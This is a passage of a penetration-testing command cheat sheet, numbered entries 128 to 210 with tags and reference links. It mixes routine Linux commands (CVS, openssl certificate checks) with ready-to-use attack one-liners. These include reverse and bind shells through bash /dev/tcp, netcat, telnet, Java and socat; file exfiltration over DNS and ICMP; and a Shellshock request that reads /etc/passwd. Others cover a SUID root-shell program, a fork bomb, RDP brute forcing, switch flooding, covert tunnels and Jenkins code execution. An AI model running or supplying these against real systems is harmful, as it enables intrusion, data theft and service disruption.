http://tulrich.com/geekstuff/cvs.html
__________
### 128. cvs update local repo
```
cvs update -d .
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 129. cvs add a new file
```
cvs add [File inc "package"]
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 130. cvs delete file
```
cvs release [package or file in package]
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 131. sslscan cert checks
```
openssl s_client -connect victim.com:443 (this shows the chain)
```
**- linux,certificates**
#### References:

http://security.stackexchange.com/questions/70733/how-do-i-use-openssl-s-client-to-test-for-absence-of-sslv3-support
__________
### 132. sslscan cert checks
```
openssl s_client -showcerts -connect victim.com:443 2>/dev/null | awk '$0=="-----BEGIN CERTIFICATE-----" {p=1}; p; $0=="-----END CERTIFICATE-----" {p=0}' (this pulls just the certificates for each in the chain)
```
**- linux,bash,certificates**
#### References:

https://www.sslshopper.com/article-most-common-openssl-commands.html
https://yg.ht
https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
__________
### 133. sslscan cert checks
```
openssl x509 -noout -text | grep -i "signature algorithm\|before\|after\|issuer\|subject:" (split the above commands output and stick in here, then manually analyse)
```
**- linux,bash,certificates**
#### References:

https://www.sslshopper.com/article-most-common-openssl-commands.html
https://yg.ht
https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
__________
### 134. Password Generator
```
genpasswd [CHAR LENGTH]
```
**- linux,passwords**
#### References:

https://www.cyberciti.biz/faq/linux-random-password-generator/
__________
### 135. nmap outbound tcp
```
nmap -sS -Pn --open -T5 -p- [portspoofip] | tee nmap-tcp-outbound.txt
```
**- linux,networking,scanning**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 136. nmap outbound upd
```
nmap -Pn --open -T5 -sU -p- [portspoofip]| tee nmap-udp-outbound.txt
```
**- linux,networking,scanning**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 137. nmap smb signing
```
nmap --script smb-security-mode.nse -p445 -iL [hostsfile] -oA nmap-SMBSigning
```
**- linux,networking,scanning,smb,MitM**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 138. nmap devicemap all tcp
```
nmap -sS -n -v -T4 -P0 -p- -oA nmap-tcp-scan -iL subnets.txt
```
**- linux,networking,scanning**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 139. nmap devicemap top 1000 udp
```
nmap -sU -n -v -T4 -P0 --top-ports 1000 -oA nmap-udp-scan -iL subnets.txt
```
**- linux,networking,scanning**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 140. nmap devicemap
```
grep "Discovered open port" nmap-udp-scan.txt | sed "s/\// /g" | sed "s/ /\t/g" | awk -F "\t" {'print $7"\t"$5"\t"$4"\topen"'} > devicemap-udp.tsv
```
**- linux,bash,text manipulation,networking**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 141. nmap service discovery
```
cat nmapScan-[SERVICE].gnmap | grep "Ports" | grep "open" | grep -v "open|filtered" | awk {'print $2'} | sort -u > IPs-[SERVICE].txt
```
**- linux,bash,text manipulation**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 142. Convert a user list in format "first last" to flast
```
cat users | awk '{print substr ($0, 1, 1),$2}' | tr [A-Z] [a-z] | sort | uniq
```
**- linux,bash,enumeration,user information,recon**
#### References:

https://necurity.co.uk
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 143. bash reverse shell using a file handle '5'
```
exec 5<>/dev/tcp/[me]/[port]; while read line 0<&5; do $line 2>&5 >&5; done
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 144. telnet reverse shell
```
rm -f /tmp/p; mknod /tmp/p p && nc [me] [port] 0/tmp/p
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 145. telnet reverse shell
```
telnet [me] [port]| /bin/bash | telnet [me] [lport]
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 146. Java reverse shell - replace ; with newline
```
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
```
**- linux,reverse shells,java**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 147. Take a screenshot of a HTTP service
```
nmap -iL hosts -sC --script http-screenshot -p 80,443,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192,6992,16993,16994,16995,623,664 -v -n
```
**- linux,networking,scanning**
#### References:

https://necurity.co.uk/netsec/2015-04-20-Screenshots-with-Nmap/
https://github.com/SpiderLabs/Nmap-Tools/commit/36d74325f5ed5a057f954c1f9dd962631766ca10
__________
### 148. moount VDI disk image
```
modprobe nbd  max_part=16;  qemu-nbd -c /dev/nbd0 [File]; fdisk -l /dev/nbd0
```
**- linux,filesystem**
#### References:

https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
__________
### 149. Mount LVM filesytem / image
```
losetup /dev/loop0 [file]; kpartx -a /dev/loop0; vgscan; vgchange -ay changethishostname-vg; mount /dev/changethishostname-vg/root mnt/
```
**- linux,filesystem**
#### References:

https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
__________
### 150. Ecrypt FS mounting
```
printf "%s" $i | ecryptfs-unwrap-passphrase .ecryptfs/victim/.ecryptfs/wrapped-passphrase -; ecryptfs-add-passphrase -fnek; mount -t ecryptfs .ecryptfs/victim/.Private/ test/
```
**- linux,filesystem**
#### References:

https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
__________
### 151. list network connections
```
netstat -tulpen
```
**- linux,bash,networking**
#### References:

https://www.cyberciti.biz/tips/tag/netstat-command
__________
### 152. print vpn keys
```
ip xfrm state list
```
**- linux,bash,networking,passwords**
#### References:

https://www.cyberciti.biz/faq/linux-ip-command-examples-usage-syntax/
__________
### 153. enable ip forwarding in the kernel temporarily
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
**- linux,bash,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/rhel-centos-fedora-linux-ip-forwarding-tutorial/
__________
### 154. Fork Bomb : CRASH SYSTEM
```
:(){:|:&;:
```
**- linux,interesting**
#### References:

https://www.cyberciti.biz/faq/understanding-bash-fork-bomb/
__________
### 155. Iptables port forward
```
iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j LOG; iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j DNAT --to-destination [rhost]:[rport]; iptables -A FORWARD -p tcp -d [ip] --dport [port] -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/tips/linux-iptables-examples.html
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables
__________
### 156. Spawn a cmd in a gui window
```
xterm -bg black -title "TryH4rD3r" -e "ls -la;read"
```
**- linux,bash,interesting**
#### References:

http://invisible-island.net/xterm/
__________
### 157. Take a screenshot of a RDP server (provided by rdpy)
```
rdpy-rdpscreenshot.py 1.1.1.1
```
**- linux,scanning,recon**
#### References:

https://github.com/citronneur/rdpy
__________
### 158. take a screenshot from a open X11 and convert it to a jpg
```
xwd -display [victim] :0 -root -out /tmp/[victim].xpm;xwd -display ip :0 -root -out /tmp/[victim].xpm; convert /tmp/[victim]; xpm -resize 1280x1024 /tmp/[victim].jpg
```
**- linux,bash,pivoting,scanning**
#### References:

http://unix.stackexchange.com/questions/44821/how-do-i-screencap-another-xorg-display
__________
### 159. capture ping replies
```
tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'
```
**- linux,packet capture**
#### References:

http://rationallyparanoid.com/articles/tcpdump.html
__________
### 160. list DC's
```
host [domain]
```
**- linux,enumeration,dns**
#### References:

https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
__________
### 161. see /etc/services
```
common ports
```
**- linux,networking,interesting**
#### References:

https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers
__________
### 162. Ip subnets
```
ipcalc -bnmp 10.0.0.1/20
```
**- linux,networking,subnets,reference**
#### References:

https://www.cyberciti.biz/tips/perform-simple-manipulation-of-ip-addresse.html
__________
### 163. Route IPV6 through ipv4 for things that don't support it
```
socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[RHOST]:[RPORT] ./[tool] 127.00.0.1:8080
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
__________
### 164. replay packets to network
```
file2cable -i eth0 -f [file]
```
**- linux,networking,packet capture**
#### References:

http://manpages.ubuntu.com/manpages/xenial/man1/file2cable.1.html
__________
### 165. Reverse look up on range
```
dnsrecon -t rvs -i 10.0.0.1,10.0.0.255
```
**- linux,scanning,dns**
#### References:

https://github.com/darkoperator/dnsrecon
__________
### 166. brute names
```
dnsrecon -t std -d [domain]
```
**- linux,scanning,dns**
#### References:

https://github.com/darkoperator/dnsrecon
__________
### 167. do a zone transfer request (just use host . . .)
```
dnsrecon -t axfr -d [domain]
```
**- linux,networking,enumeration,dns**
#### References:

https://github.com/darkoperator/dnsrecon
__________
### 168. exfil file through DNS, may want to encrypt, also assuming you have a short domain
```
for line in `base64 -w 62 [file]`; do host $line.[hostname]; done
```
**- linux,bash,loop,interesting**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 169. look for a free short domain, good luck
```
for a in {a..z}; do for b in {a..z}; do for c in {a..z}; do for d in {a..z}; do whois $a$b.$c$d; done; done;done;done
```
**- linux,networking,loop,dns**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 170. Exfil over icmp
```
ping -p 11010101010101010101010101010199 -c 1 -M do 127.0.0.1 -s 32; for line in `base64 sslfile.key | xxd -p -c 14`; do line2=`echo "11 $line 99" |tr -d ' '`; ping -p $line2 -c 1 -M do 127.0.0.1 -s 32; done; ping -p 11101010101010101010101010101099 -c 1 -M do 127.0.0.1 -s 32
```
**- linux,networking,loop,interesting**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 171. forward local traffic htting lport to [rip]:[rport]
```
socat TCP4:LISTEN:[lport] TCP4:[rip]:[rport]
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
__________
### 172. tcp port scanning from bash, just wireshark on the ip, useful if you have cmd execution on web app
```
for i in {1..65000}; do echo 1 > /dev/tcp/[ip]/$i; echo $i; done
```
**- linux,bash,networking,loop,interesting,scanning**
#### References:

http://tldp.org/LDP/abs/html/devref1.html
__________
### 173. ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1
```
ssh -o StrictHostKeyChecking=no -t -t -i [private_key] -R [lport]:[rhost]:[rip] [user]@[ip]
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 174. set up a socks proxy, proxycahins may help also
```
ssh -D [port] [user]@[ip]
```
**- linux,networking,pivoting**
#### References:

https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 175. try to make the switch fall over, and turn into a hub
```
ettercap -TP rand_flood
```
**- linux,MitM**
#### References:

https://linux.die.net/man/8/ettercap_plugins
__________
### 176. Do a netbios name query.
```
nmblookup [name]
```
**- linux,scanning,smb**
#### References:

http://linuxcommand.org/man_pages/nmblookup1.html
__________
### 177. Pretty terminal PS1 that is copy n paste safe
```
export PS1="# \A:\[$(tput sgr0)\]\[\033[38;5;1m\]\u:\W:\[$(tput sgr0)\] "
```
**- linux,bash**
#### References:

http://bashrcgenerator.com/
__________
### 178. search the manual page names and descriptions
```
apropos [keyword]
```
**- linux,interesting**
#### References:

http://www.thegeekstuff.com/2009/11/5-methods-to-get-quick-help-on-linux-commands/
__________
### 179. Query the remote ntp time
```
sntp [ip]
```
**- linux,networking**
#### References:

http://doc.ntp.org/4.2.6/sntp.html
__________
### 180. Ask for a zone transfer
```
host -t axfr [ip]
```
**- linux,networking,enumeration**
#### References:

https://tools.ietf.org/html/rfc5936
__________
### 181. show users rlogin
```
rusers -al [ip]
```
**- linux,enumeration**
#### References:

http://linuxcommand.org/man_pages/rusers1.html
__________
### 182. List users of the remote system
```
samrdump.py -hashes [LMHASH:NTHASH] [user]:[pass]@[victim]
```
**- linux,enumeration,impacket**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 183. Login using rlogin : Not installed by default
```
rlogin -l [user] [target]
```
**- linux**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 184. Show remote users using finger : Not installed by default? : use 0@[ip] for Solaris bug
```
finger @[ip]
```
**- linux,enumeration**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 185. Remove trailing whitespace
```
sed -i 's/[[:space:]]*$//' [input]
```
**- linux,bash,text manipulation**
#### References:

http://ask.xmodulo.com/remove-trailing-whitespaces-linux.html
__________
### 186. NCC Shellshock tool
```
./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
```
**- linux**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
git clone https://github.com/nccgroup/shocker
__________
### 187. Shellshock Read File : Replace echo with anything you want
```
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
```
**- linux**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 188. Simple SUID program  
```
int main(void){setresuid(0, 0, 0);system("/bin/bash");}
```
**- linux,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 189. Call a shell from a number of programs, VIM, Nmap FTP SFTP etc
```
!bash
```
**- linux,shell,privilege escalation**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 190. brute force RDP
```
ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21
```
**- linux,brute**
#### References:

https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
__________
### 191. GitUp : Update all the opt gits
```
for i in $(ls -alh /data/shares/opt/ | grep "^drw" | awk '{print $9}'); do cd /data/shares/opt/$i; git pull; echo $i;done | grep -v fatal
```
**- linux,interesting,GIT**
#### References:

https://yg.ht
__________
### 192. XfreeRDP new swtich format
```
xfreerdp +clipboard /drive:[sharename],[path] /u:[user] /d:[domain] /p:[password ] /size:80% /v:[host]
```
**- linux,pivoting,RDP**
#### References:

https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface
__________
### 193. Create a SSH based TAP VPN
```
ssh username@server -w any:any & ip addr add 100.64.1.2/32 peer 100.64.1.1 dev ; ssh root@[ip] -C 'ip addr add 100.64.1.1/32 peer 100.64.1.2 dev tun0; route add -net [destnet]/16 gw 1.1.1.1;
```
**- linux,bash,pivoting**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
__________
### 194. Hans ICMP tunnel, first cmd is server, second client
```
./hans -v -f -s 100.64.1.1 -p [password]; ./hans -f -c [ip] -p [password] -v
```
**- linux,pivoting**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
http://code.gerade.org/hans/
__________
### 195. ICMP tunnel, first cmd is server, second client
```
iodined -f -c -P [password] 100.164.1.1 [serveraddr]; iodine -f -P [password] [serveraddr] -r
```
**- linux,pivoting**
#### References:

http://code.kryo.se/iodine/
https://artkond.com/2017/03/23/pivoting-guide/
__________
### 196. DNS tunnel, first cmd is server, second client.
```
ruby ./dnscat2.rb tunneldomain.com; ./dnscat2 tunneldomain.com
```
**- linux,pivoting**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
https://github.com/iagox86/dnscat2
__________
### 197. NTLM aware proxy client, proxychains
```
echo "Username [user]" >> config; echo "Password [pass]" >> config; echo "Domain [domain]" >> config; echo "Proxy [proxyIP]" >> config; echo "Tunnel [lport]:[lip]:[rport]" >> config; cntlm.exe -c config.conf
```
**- linux,pivoting,Windows**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
http://cntlm.sourceforge.net/	
__________
### 198. Run program over socks proxy
```
echo "[ProxyList]" > /etc/proxychains.conf; echo "socks4  127.0.0.1 2222" >> /etc/proxychains.conf; proxychains [program]
```
**- linux,pivoting**
#### References:

http://proxychains.sourceforge.net/
https://artkond.com/2017/03/23/pivoting-guide/
__________
### 199. Socat BindShell, First on server, second on client
```
socat TCP-LISTEN:[lip],reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane; socat FILE:`tty`,raw,echo=0 TCP:[rip]:[rport]
```
**- linux,pivoting,shells**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
__________
### 200. Socat reverse shell, First on client, second on server
```
socat TCP-LISTEN:[lip],reuseaddr FILE:`tty`,raw,echo=0; socat TCP4:[rip]:[rport] EXEC:bash,pty,stderr,setsid,sigint,sane
```
**- linux,pivoting,reverse shells**
#### References:

https://artkond.com/2017/03/23/pivoting-guide/
__________
### 201. enumerate users and groups
```
getent passwd; getent group;
```
**- linux,enumeration**
#### References:

https://www.unixtutorial.org/commands/getent/
__________
### 202. OpenSSL Encypt, add -a if input is b64, 
```
openssl aes-256-cbc -in some_file.enc -out some_file.unenc -e -pass pass:somepassword
```
**- linux,bash,encryption**
#### References:

http://tombuntu.com/index.php/2007/12/12/simple-file-encryption-with-openssl/
__________
### 203. OpenSSL decrypt, add -a if input is b64, 
```
openssl aes-256-cbc -in some_file.enc -out some_file.unenc -d -pass pass:somepassword
```
**- linux,bash,encryption**
#### References:

http://tombuntu.com/index.php/2007/12/12/simple-file-encryption-with-openssl/
__________
### 204. Most used Terminal commands
```
history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
```
**- linux,bash,interesting**
#### References:

http://www.commandlinefu.com/commands/view/350/output-your-microphone-to-a-remote-computers-speaker
__________
### 205. Project your mic to remote hosts speakers
```
dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp
```
**- linux,bash,interesting**
#### References:

http://www.commandlinefu.com/commands/view/350/output-your-microphone-to-a-remote-computers-speaker
__________
### 206. Locate SUID files owned by root
```
find / \( -type f -a -user root -a -perm -4001 \) 
```
**- linux,privilege escalation**
#### References:

https://pen-testing.sans.org/resources/papers/gcih/discovering-local-suid-exploit-105447
https://www.pentestpartners.com/blog/exploiting-suid-executables/
__________
### 207. Quick formatted link to check ketne exploits
```
echo "https://www.kernel-exploits.com/kernel/?version="`uname -r  | awk -F . '{print $1"."$2}'`
```
**- linux,privilege escalation**
#### References:

https://www.kernel-exploits.com
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
__________
### 208. Convert exfil ICMP back to files from pcap
```
for line in $(tshark -r [pcap] -T fields -e data  | uniq | grep -v "......................................................" | sed s/.*11/11/g | grep "11.*99"  | sed s/11// | sed s/99$// | tr -d '\n' | sed s/0101010101010101010101010101/'\n'/g |sed s/010101010101010101010101010//g); do echo $line | xxd -r  -p | base64 -d;echo +++++++++++++++++++; done
```
**- linux,networking,loop**
#### References:

https://ask.wireshark.org/questions/15374/dump-raw-packet-data-field-only
__________
### 209. Check battery level
```
upower -i $(upower -e | grep 'BAT') | grep -E "state|to\ full|percentage"
```
**- linux**
#### References:

https://askubuntu.com/questions/69556/how-to-check-battery-status-using-terminal
__________
### 210. Execute GroovyScript on Jenkins, You can also execute commands when ReBuilding projects. Also user addition has a path traversal vuln allowing you to override users when registering.
```
def process = "ls -l".execute();println "Found text ${process.text}"
```
**- linux,web application,Windows,code execution,Groovy**
#### References:

https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/
https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/
https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console
__________
